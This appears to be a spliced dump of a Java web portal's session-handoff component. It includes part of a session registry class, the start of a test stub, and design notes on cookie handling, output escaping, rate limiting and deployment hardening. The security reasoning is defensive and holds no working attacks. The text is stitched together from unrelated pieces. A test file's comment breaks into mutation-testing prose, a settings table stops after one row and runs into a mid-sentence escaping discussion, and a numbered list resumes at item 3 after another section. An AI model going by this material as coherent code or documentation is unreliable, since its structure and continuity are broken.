72\t     * it signs in with it before anything else does, and a previous call to this method has already\n    73\t     * removed it from the live set, so the selector cannot be turned into a session-invalidation\n    74\t     * oracle for a session the caller picked.\n    75\t     */\n    76\t    public static synchronized boolean expireOldest() {\n    77\t        for (int i = 0; i < CREATION_ORDER.size(); i++) {\n    78\t            String candidate = CREATION_ORDER.get(i);\n    79\t            if (Boolean.TRUE.equals(LIVE.get(candidate))) {\n    80\t                LIVE.remove(candidate);\n    81\t                return true;\n    82\t            }\n    83\t        }\n    84\t        return false;\n    85\t    }\n    86\t\n    87\t    public static int liveCount() {\n    88\t        return LIVE.size();\n    89\t    }\n    90\t}\nFILE src/test/java/com/acme/portal/testapp/StubSessionVerifier.java\n     1\tpackage com.acme.portal.testapp;\n     2\t\n     3\timport com.acme.portal.session.SessionHandoffService;\n     4\t\n     5\t/**\n     6\t * TEST SCAFFOLDING ONLY. Detection came from reconciling the\n  per-mutant logs rather than the tally: exactly one mutant had that `FAILED` line as its *only*\n  failure, which is the signature of a broken test rather than a broken guard. Every threshold in the\n  suite is now derived from a measured value, and the corpus floor states the number it was taken from.\n\n## Deploying it\n\n1. Put the compiled classes and the verifier implementation on the classpath, register it in\n   `META-INF/services/com.acme.portal.session.SessionHandoffService$SessionStateVerifier`, map\n   `SessionHandoffServlet` to one path, and map the authenticator filter to that same path ahead of\n   it. `deploy/web.xml` is the starting point; the test-only elements in the e2e wars are injected\n   from `deploy/web.test-only.xml` and are not in it.\n2. Serve it over HTTPS with HSTS at the terminator. `Secure` is unconditional, so plain HTTP simply\n   stops working — that is the intended failure mode.\n3. `deploy/WEB-INF/static/error.html` must stay a static file with no request data.\n4. Keep the classpath and the war's code source non-writable by \"other\"; the component will refuse to\n   start otherwise, and the log says why.\n5. Optional settings, all validated and ranged, all refusing to start the component rather than\n   defaulting permissively if wrong:\n\n   | Variable | Default | Bounds |\n   | --- | --- | --- |\n   | `PORTAL_COOKIE_NAME` | `__Host-PORTAL_SESSION` | ≤ 64 chars, token charset, no protocol keyword |\n  one string the granted page interpolates is the cookie *name* from validated configuration, and it\n  goes through `ResponseBody.escapeHtml` anyway — output encoding should not depend on a validator\n  never regressing. The escaper does one pass with `&` handled first, so no replacement can be escaped\n  again by a later one; control characters including NUL become a space rather than an entity; and the\n  limit is placed on the **escaped output**, not on the input read. Each character is charged the widest\n  entity it could expand to (`&quot;`, six bytes) *before* it is appended, so the emitted page cannot\n  pass 256 bytes however the characters fall, and an entity is always whole or absent — cutting on the\n  output length instead would leave `&quo` in a document, which is worse markup than stopping one entity\n  early. Bounding the input was the earlier defect: 256 `\"` characters are 1 536 bytes of `&quot;`, on a\n  page whose own guard had just reported itself satisfied.\n- **Bounded stored size:** the only thing this component stores is rate-limit counters — one\n  `{count, windowStart}` per canonical source key, at most `maxTrackedSources` keys, each canonical\n  key at most 64 characters. No identifier, address or payload is ever retained past the request.\n- **Private file modes:** the component writes no files. It additionally refuses to *start* if its\n  own code source or the verifier's is world-writable (`DeploymentHygiene`, POSIX `OTHERS_WRITE`), and\n  fails closed on a filesystem whose permissions it cannot judge — that is rule 8's \"never load code\n  from a shared place\" enforced at runtime rather than left to a runbook. Two details in that guard are\n  findings that were fixed rather than design flourishes. A code location the deployment names but that\n  cannot be inspected — because it is not there — is now a **refusal** instead of a skipped entry: a\n  check that certifies only the directories it happened to be able to `stat` has certified nothing about\n  the ones it could not. And every path that reaches a refusal message goes through a sanitiser\n  (control characters dropped, length capped, an empty name called out as unnamed), because those\n  strings come from `java.class.path` and the filesystem — an unsanitised one puts a newline in a log\n  line, which is how a file name forges a second record. Test scratch directories are created per PID\n  and removed by a shutdown hook (not at the end of `main`, which the failure paths never reach).\n- **\"Clear credentials from memory when done\" — the honest version.** The JVM cannot honour this for a\n  `String`, and this task's input *is* a `String` handed over by another component. `String` is\n  immutable, its value is not zeroable, garbage collection decides when the memory is reusable, and\n  the JIT may intern or copy it. Pretending otherwise would be the kind of claim a reviewer is right\n  to report. What the code actually does, and the most that is achievable here:\n  - the fewest possible copies: `CacheSupport.digestHexPrefix` feeds the digest from the parts\n    without materialising `prefix + secret`, and truncates during formatting rather than building a\n    64-character digest string and cutting it;\n  - every intermediate *it* allocates is zeroed on the way out (`byte[]`, `char[]`, digest output);\n  - the copy it does not own is not extended: no cache holds it, no field outside the request-scoped\n    `SessionId` does, and `value()` is package private so nothing else can retain it casually.\n  A deployment that must bound credential lifetime at the byte level needs the platform's\n  char[]-based APIs (`PBEKeySpec`, `SecretKeySpec`) on the *producer* side, which is the authenticator,\n  not this component.\n\n### 6. Failure behaviour — identical messages, comparable work, no permissive default\n\n- **One** refusal body for `403`, `429` and `503`. The harness asserts every refusal path renders\n  byte-identical output and that the set of distinct refusal bodies has exactly one member.\n- **No existence oracle.** `403` means \"no session was issued to you\", which is true and already\n  observable from the missing cookie; it never says whether the identifier was absent, malformed,\n3. A second independent validation gate at the moment of cookie emission\n   ([`SessionCookieWriter`](src/main/java/com/acme/portal/session/SessionCookieWriter.java)), so a\n   future path that reaches the writer by another route still cannot emit an unvalidated value.\n4. `SessionId.generate()` — the component's own 256-bit CSPRNG path — exists, is tested, and is what\n   a deployment that *can* mint its own identifiers should use. It is not used for the handoff,\n   because handing out a freshly minted id for an asserted one would create a second session\n   mechanism.\n\n**Residual risk, which no validation in this file removes:** if the upstream authenticator can be\ntricked into asserting an identifier that belongs to somebody else, this component will correctly\nverify that the session exists and correctly set the cookie — for the attacker. The trust placed in\nthe authenticator is real and cannot be validated from here. What limits the blast radius:\n\n- The assertion attribute is read **only** as a `String` set by server-side code in the same JVM.\n  The reader never looks at cookies, query parameters, body fields, or any header, so a client\n  cannot name the attribute it wants copied into a cookie.\n- Anything that *can* set a request attribute in that JVM can already act as the user; the component\n  adds no new way to reach them.\n- The value never lands in a URL, a log line, a body, a file, or `toString()` — so handing it to the\n  browser is the only disclosure path, and the browser is the intended recipient.\n- Deployment requirement: the filter that sets the attribute must be mapped to this servlet's exact\n  path, must run before it, and nothing upstream may copy client data into that attribute.\n\n`X-Forwarded-For` and every other `*-For` header are **never read**. `ClientAddress` keys the limiter\non `request.getRemoteAddr()` alone. Behind a proxy that field is the proxy's address, so every\nclient shares one bucket — an availability annoyance, never an authorisation decision. Reading\n`X-Forwarded-For` instead would hand the attacker the choice of rate-limit bucket, i.e. a way to\nframe another source. If a deployment *must* key limits on the real client, the proxy has to\noverwrite a single well-known header and the change belongs in `ClientAddress`, which is the only\nclass that names a source.\n\n## Rule by rule: how the code satisfies each of the eight rules\n\n### 1.
